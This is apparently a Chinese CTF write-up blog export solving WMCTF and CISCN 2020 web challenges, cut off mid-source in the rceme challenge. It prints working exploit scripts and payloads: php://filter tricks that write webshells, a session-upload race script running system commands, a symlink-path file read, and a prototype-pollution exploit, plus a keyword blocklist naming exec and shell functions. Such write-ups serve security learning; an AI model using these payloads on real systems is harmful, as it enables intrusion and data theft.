<h1 id="web"><a href="#web" class="headerlink" title="web"></a><strong>web</strong></h1><h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a><strong>web_checkin</strong></h2><p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sandbox = <span class="string">&#x27;/var/www/html/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,$content))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以先学习P神的死亡exit的绕过：<a class="foo" target="_blank" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></p>
<p>这里的话看到<code>file_put_contents()</code>一般就是写shell了，但是因为前面有<code>exit()</code>导致即使我们成功写入一句话，也执行不了，一般来说可以用base64可以直接绕过，如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>先<code>strip_tags</code>去除死亡<code>exit</code>，再将<code>webshell</code>用<code>base64-decode</code>还原</p>
<p>又或者</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.rot13/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>原理和上面类似，核心是将”死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，</p>
<p>如果我们上传<code>&lt;?cuc cucvasb();?&gt;</code>，经过rot13编码后会变成<code>&lt;?php phpinfo();?&gt;</code>。</p>
<p>这就是P神的三种绕过exit的方法，但是题目过滤了<code>rot</code>，<code>base64</code>，以及<code>file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);</code>，前后两个地方都是content，所以这题的解法要改一下。</p>
<p>一般来说往文件里面写东西并绕过exit是这样的</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?content=php://filter/write=string.strip_tags/some_thing/resource=1.php</span><br></pre></td></tr></table></figure>

<p>比如说写一个<code>.htaccess</code>(这里参考hhhm师傅博客)</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?content=php://filter/write=string.strip_tags/?&gt;AddType application/x-httpd-php .jpg%0aphp_value auto_append_file &#x27;php://filter/convert.ba\%0Ase64-decode/reso\%0Aurce=a.jpg&#x27;%0A%23/resource=.htaccess</span><br></pre></td></tr></table></figure>

<p>会得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file <span class="string">&#x27;php://filter/convert.ba\</span></span><br><span class="line"><span class="string">se64-decode/reso\</span></span><br><span class="line"><span class="string">urce=a.jpg&#x27;</span></span><br><span class="line"><span class="comment">#/resource=.htaccess</span></span><br></pre></td></tr></table></figure>

<p>前置知识看好后，下面是官方的解法了。</p>
<h3 id="二次编码绕过"><a href="#二次编码绕过" class="headerlink" title="二次编码绕过"></a><strong>二次编码绕过</strong></h3><p><code>file_put_contents</code>中可以调用伪协议，而伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的，不过%25被ban了，测试%25被ban后就可以写个脚本跑一下字符，构造一些过滤的字符就可以利用正常的姿势绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$char = <span class="string">&#x27;r&#x27;</span>; <span class="comment">#构造r的二次编码 </span></span><br><span class="line"><span class="keyword">for</span> ($ascii1 = <span class="number">0</span>; $ascii1 &lt; <span class="number">256</span>; $ascii1++) &#123; </span><br><span class="line">    <span class="keyword">for</span> ($ascii2 = <span class="number">0</span>; $ascii2 &lt; <span class="number">256</span>; $ascii2++) &#123; </span><br><span class="line">        $aaa = <span class="string">&#x27;%&#x27;</span>.$ascii1.<span class="string">&#x27;%&#x27;</span>.$ascii2; </span><br><span class="line">        <span class="keyword">if</span>(urldecode(urldecode($aaa)) == $char)&#123; </span><br><span class="line">            <span class="keyword">echo</span> $char.<span class="string">&#x27;: &#x27;</span>.$aaa; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=Cyc1e.php </span><br><span class="line"><span class="comment">#Cyc1e.php </span></span><br><span class="line">&lt;?cuc rkvg();cuc://svygre/jevgr=fgevat.%72bg13|&lt;?php phpinfo();?&gt;|/erfbhepr=Plp1r.cuc </span><br></pre></td></tr></table></figure>

<h3 id="过滤器绕过"><a href="#过滤器绕过" class="headerlink" title="过滤器绕过"></a><strong>过滤器绕过</strong></h3><p>题目中过滤的过滤器有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/iconv|UCS|UTF|rot|quoted|base64/ </span><br></pre></td></tr></table></figure>

<p>预留了zlib、bzip2、string等过滤器， <code>php:filter</code> 支持使用多个过滤器，所以可以利用 <code>zlib</code> 的 <code>zlib.deflate</code> 和 <code>zlib.inflate</code> 来做，压缩后再解压后内容肯定不变，可以在中间遍历一下剩下的几个过滤器，看看中间操作时候是否会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e.php </span><br></pre></td></tr></table></figure>

<p>会生成这个</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php@…xit();php://fil|mr/zlib.lmfla|m|s|ring.|olowmr|zlib.infla|m|?&gt;&lt;?php</span><br><span class="line">eval($_GET[1]);?&gt;/vesouvce=Cyc1e.&lt;?p</span><br></pre></td></tr></table></figure>

<h3 id="爆破临时文件"><a href="#爆破临时文件" class="headerlink" title="爆破临时文件"></a><strong>爆破临时文件</strong></h3><p>环境特地设置了php 7.0.33版本，由于file_put_contents也可以利用伪协议，所以老问题，利用string.strip_tags会发生段错误，这时候上传一个shell会以临时文件的形式保存在/tmp中，利用require_once包含getshell即可。</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">​</span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">​</span><br><span class="line">host = <span class="string">&quot;web_checkin2.wmctf.wetolink.com&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span>(<span class="params">url, file_content</span>):</span></span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;evil.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span>():</span></span><br><span class="line">    file_content = <span class="string">&#x27;&lt;?php system(&quot;xxxxxxxx&quot;);?&gt;&#x27;</span></span><br><span class="line">    phpinfo_url = <span class="string">&quot;%s/?content=php://filter/write=string.strip_tags/resource=Cyc1e.php&quot;</span> % (</span><br><span class="line">        base_url)</span><br><span class="line">    <span class="keyword">print</span> phpinfo_url</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;[+] %d / %d&quot;</span> % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line">​</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_tmp_files()</span><br></pre></td></tr></table></figure>

<h2 id="Make-PHP-Great-Again"><a href="#Make-PHP-Great-Again" class="headerlink" title="Make PHP Great Again"></a><strong>Make PHP Great Again</strong></h2><p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里因为<code>flag.php</code>被<code>require_once</code>包含过一次了，所以下面如果用伪协议去读的话，是读取不到flag.php的内容的。第一个版本存在非预期：session.upload_progress</p>
<p>具体可以参考：<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php?file=/tmp/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>

<p>原理就是利用的是条件竞争，上传一个足够大的文件增加session文件的存在时间使得包含成功。</p>
<h2 id="Make-PHP-Great-Again2"><a href="#Make-PHP-Great-Again2" class="headerlink" title="Make PHP Great Again2"></a><strong>Make PHP Great Again2</strong></h2><p>PHP最新版 的小 Trick， require_once 包含的软链接层数较多事 once 的 hash 匹配会直接失效造成重复包含。</p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h1><h2 id="Happy-birthday"><a href="#Happy-birthday" class="headerlink" title="Happy_birthday!"></a><strong>Happy_birthday!</strong></h2><p>打开题目看到文件名”daolnwod.zip”，看到文件结尾的4B 50不难想到将文件reverse后就能得到压缩包和flag </p>
<p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;daolnwod.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">f = f[::<span class="number">-1</span>]</span><br><span class="line">f2 = open(<span class="string">&#x27;flag.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(f)</span><br></pre></td></tr></table></figure>

<p>解压即可得到flag。</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>ciscn初赛 2020</title>
    <url>/2020/08/22/ciscn%E5%88%9D%E8%B5%9B/</url>
    <content><![CDATA[<p>一次躺赢的比赛<a id="more"></a></p>
<p>一队wp:<a style="text-decoration:none;" class="foo" href="https://www.redmango.top/article/44" target="_blank">传送门</a></p>
<p>y1ng师傅wp:<a style="text-decoration:none;" class="foo" href="https://www.gem-love.com/ctf/2569.html" target="_blank">传送门</a></p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a><strong>easyphp</strong></h2><p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">   $pid = pcntl_fork();</span><br><span class="line">   <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">       <span class="comment">// 创建子进程错误，返回-1</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&#x27;could not fork&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">       <span class="comment">// 父进程会得到子进程号，所以这里是父进程执行的逻辑</span></span><br><span class="line">       $r=pcntl_wait($status);</span><br><span class="line">       <span class="comment">// 父进程必须等待一个子进程退出后，再创建下一个子进程。</span></span><br><span class="line">       <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;<span class="comment">//检查状态代码是否代表一个正常的退出。</span></span><br><span class="line">           <span class="comment">//返回值当子进程状态代码代表正常退出时返回 TRUE ,其他情况返回 FALSE。</span></span><br><span class="line">           phpinfo();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,$_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">           call_user_func_array($_GET[<span class="string">&#x27;a&#x27;</span>],[$_GET[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">       posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">       <span class="comment">//向当前进程发送SIGUSR1信号</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>主要是想进入<code>phpinfo</code>这里子句里面，也就是要让<code>pcntl_wifexited($status)</code>为FALSE</p>
<p>可以给a传<code>fsockopen</code>造成异步，使得当前线程退出，父线程就运行了<code>phpinfo</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://eci-2ze6ie6rtdjibnmrjlx4.cloudeci1.ichunqiu.com/?a=fsockopen&amp;b=1</span><br></pre></td></tr></table></figure>

<p>在phpinfo页面发现flag。</p>
<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a><strong>littlegame</strong></h2><p>给了源码附件，关键代码如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&quot;/DeveloperControlPanel&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    <span class="keyword">if</span> (req.body.key === <span class="literal">undefined</span> || req.body.password === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.send(<span class="string">&quot;What&#x27;s your problem?&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">&quot;Wrong password!Are you Admin?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/SpawnPoint&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    req.session.knight = &#123;</span><br><span class="line">        <span class="string">&quot;HP&quot;</span>: <span class="number">1000</span>,</span><br><span class="line">        <span class="string">&quot;Gold&quot;</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="string">&quot;Firepower&quot;</span>: <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">&quot;Let&#x27;s begin!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&quot;/Privilege&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Why not ask witch for help?</span></span><br><span class="line">    <span class="keyword">if</span>(req.session.knight === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/SpawnPoint&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.NewAttributeKey === <span class="literal">undefined</span> || req.body.NewAttributeValue === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;What&#x27;s your problem?&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.body.NewAttributeKey.toString();</span><br><span class="line">            <span class="keyword">let</span> value = req.body.NewAttributeValue.toString();</span><br><span class="line">            setFn(req.session.knight, key, value);</span><br><span class="line">            res.send(<span class="string">&quot;Let&#x27;s have a check!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>可以看到路由<code>/DeveloperControlPanel</code>如果<code>Admin[key] === password</code>就会输出<code>flag</code>，然后</p>
<p>路由<code>/Privilege</code>先检查<code>req.session.knight </code>，<code>req.body.NewAttributeKey</code>，<code>req.body.NewAttributeValue</code>是否未定义，当然这里的<code>key</code>和<code>value</code>都是可控的，然后下面有个关键点就是<code>setFn(req.session.knight, key, value);</code>这里<code>setFn</code>用了<code>require(&#39;set-value&#39;);</code>这个模块。也就是往<code>req.session.knight</code>添加一个键值对。</p>
<p>这里想到用原型链污染，进行污染对象原型，从而可以修改Admin的key和password。</p>
<p>先访问<code>/SpawnPoint</code>生成<code>session</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://eci<span class="number">-2</span>ze9505q64pi62k5m16h.cloudeci1.ichunqiu.com:<span class="number">8888</span>/SpawnPoint</span><br></pre></td></tr></table></figure>

<p>然后在<code>Privilege</code>进行原型链污染，再在<code>/DeveloperControlPanel</code>输入值即可获取flag。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;__jsluid_h=b34fa3669aa578dc0618e3f9aa1c3a45; session=s:zvjsKzwgmvmxjeoGEWv8F5SimfB6LlQD.YrK/DLOjKSGHC2HJpOHGiV/cmaurt2/fpbrwMle3nLM&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://eci-2ze6ie6rtdji62dm1xo6.cloudeci1.ichunqiu.com:8888/Privilege&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;NewAttributeKey&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&quot;NewAttributeValue&quot;</span>:<span class="string">&#x27;__proto__.[abcd]&#x27;</span>&#125;</span><br><span class="line">r= requests.session()</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze6ie6rtdji62dm1xo6.cloudeci1.ichunqiu.com:8888/DeveloperControlPanel&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;key&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>&#125;</span><br><span class="line">r= requests.session()</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a><strong>rceme</strong></h2><p>源码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">&quot;*&quot;</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，执行出错，发现危险字符【&#x27;</span>.$val.<span class="string">&#x27;】&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^[a-z]$/i&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，执行出错，发现危险字符&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span>(<span class="params"> $content </span>) </span>&#123;</span><br><span class="line">    $pattern = <span class="string">&#x27;/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $out_html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span 